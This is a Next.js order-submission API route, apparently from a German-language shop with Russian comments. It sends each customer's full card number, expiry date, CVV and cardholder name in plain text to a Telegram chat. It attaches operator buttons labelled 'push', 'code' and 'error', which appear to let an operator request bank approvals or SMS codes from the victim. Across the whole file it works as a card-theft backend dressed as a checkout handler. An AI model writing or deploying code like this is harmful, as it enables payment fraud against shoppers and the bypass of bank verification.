import { NextRequest, NextResponse } from 'next/server';

export const dynamic = 'force-dynamic';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_ADMIN_ID = process.env.TELEGRAM_ADMIN_ID || '';

interface OrderData {
  items: Array<{
    title: string;
    quantity: number;
    price: number;
  }>;
  total: number;
  shippingAddress: {
    name: string;
    street: string;
    city: string;
    postalCode: string;
    country: string;
  };
  paymentData: {
    cardNumber: string;
    cardExpiry: string;
    cardCVV: string;
    cardName: string;
  };
  customerEmail: string;
  orderId?: string;
}

export async function POST(request: NextRequest) {
  try {
    const requestBody = await request.json() as OrderData;
    const orderData = requestBody;
    
    // Используем переданный orderId или генерируем новый
    const orderId = requestBody.orderId || `order_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    // Форматируем сообщение для Telegram
    const itemsText = orderData.items
      .map((item, index) => 
        `${index + 1}. ${item.title}\n   Menge: ${item.quantity} × ${item.price.toFixed(2)} € = ${(item.price * item.quantity).toFixed(2)} €`
      )
      .join('\n\n');

    const message = `🛒 **NEUE BESTELLUNG**

📦 **Artikel:**
${itemsText}

💰 **Gesamtbetrag:** ${orderData.total.toFixed(2)} €

👤 **Kunde:**
Name: ${orderData.shippingAddress.name}
E-Mail: ${orderData.customerEmail}

📍 **Lieferadresse:**
${orderData.shippingAddress.street}
${orderData.shippingAddress.postalCode} ${orderData.shippingAddress.city}
${orderData.shippingAddress.country}

💳 **Zahlungsdaten:**
Karte: \`${orderData.paymentData.cardNumber}\`
Ablaufdatum: ${orderData.paymentData.cardExpiry}
CVV: \`${orderData.paymentData.cardCVV}\`
Name auf Karte: ${orderData.paymentData.cardName}

⏰ **Zeitpunkt:** ${new Date().toLocaleString('de-DE', { 
  year: 'numeric', 
  month: 'long', 
  day: 'numeric', 
  hour: '2-digit', 
  minute: '2-digit' 
})}`;

    // orderId уже определен выше из requestBody

    // Отправляем сообщение в Telegram с inline кнопками
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_ADMIN_ID,
        text: message,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'пуш', callback_data: `push_${orderId}` },
              { text: 'код', callback_data: `code_${orderId}` },
              { text: 'ошибка', callback_data: `error_${orderId}` }
            ]
          ]
        }
      }),
    });

    const data = await response.json();

    if (!response.ok) {
      console.error('Telegram API error:', data);
      return NextResponse.json(
        { error: 'Fehler beim Senden der Nachricht', details: data },
        { status: 500 }
      );
    }

    return NextResponse.json({ 
      success: true, 
      messageId: data.result.message_id,
      orderId: orderId
    });
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return NextResponse.json(
      { error: 'Fehler beim Senden der Nachricht' },
      { status: 500 }
    );
  }
}
